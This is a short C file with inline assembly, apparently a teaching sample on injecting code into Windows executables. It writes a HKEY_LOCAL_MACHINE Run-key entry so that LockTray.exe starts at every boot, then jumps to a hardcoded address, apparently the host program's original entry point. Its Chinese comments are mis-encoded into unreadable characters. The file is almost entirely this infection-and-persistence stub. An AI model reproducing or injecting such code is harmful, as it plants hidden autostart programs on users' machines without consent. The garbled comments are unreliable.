//��������
//
//
//release�� 
//���ð�ȫ��� (/GS-)
//�Ż� �ѽ��� (/Od)
//��ڵ�ĳ�main
//�����ɵ�����Ϣ


#include<windows.h>



TCHAR sz1[] = TEXT("SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN");
TCHAR sz2[] = TEXT("NewValue");
TCHAR sz3[] = TEXT("d:\\masm32\\source\\chapter5\\LockTray.exe");


void main()
{
	HKEY hKey;// ���
	RegCreateKey(HKEY_LOCAL_MACHINE, sz1, &hKey);// ����ע�����
	RegSetValueEx(hKey, sz2, 0, REG_SZ, sz3, 0X27);// ����ע�����
	RegCloseKey(hKey);// �ر�ע�����
	__asm
	{
		leave
		mov eax, 0x00401000// ���ش���ԭ��ַ
		jmp eax
	}
}